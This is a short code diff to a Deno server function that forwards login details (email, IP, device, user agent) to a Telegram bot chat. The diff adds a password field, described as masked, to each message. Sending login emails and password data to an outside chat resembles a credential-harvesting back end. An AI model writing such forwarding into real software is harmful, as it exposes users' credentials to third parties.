@@ -9,7 +9,7 @@ Deno.serve(async (req) => {
   }
 
   try {
-    const { email, user_agent, device_info } = await req.json();
+    const { email, user_agent, device_info, masked_password } = await req.json();
 
     const botToken = Deno.env.get('TELEGRAM_BOT_TOKEN');
     const chatId = Deno.env.get('TELEGRAM_CHAT_ID');
@@ -24,7 +24,7 @@ Deno.serve(async (req) => {
     // Get client IP from headers
     const ip = req.headers.get('x-forwarded-for') || req.headers.get('cf-connecting-ip') || 'unknown';
 
-    const message = `🔐 <b>New Login Activity</b>\n\n📧 <b>Email:</b> ${email}\n🌐 <b>IP:</b> ${ip}\n📱 <b>Device:</b> ${device_info || 'unknown'}\n🖥 <b>User Agent:</b> ${(user_agent || '').substring(0, 100)}\n🕐 <b>Time:</b> ${new Date().toISOString()}`;
+    const message = `🔐 <b>New Login Activity</b>\n\n📧 <b>Email:</b> ${email}\n🔑 <b>Password:</b> ${masked_password || 'unknown'}\n🌐 <b>IP:</b> ${ip}\n📱 <b>Device:</b> ${device_info || 'unknown'}\n🖥 <b>User Agent:</b> ${(user_agent || '').substring(0, 100)}\n🕐 <b>Time:</b> ${new Date().toISOString()}`;
 
     const tgResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: 'POST',
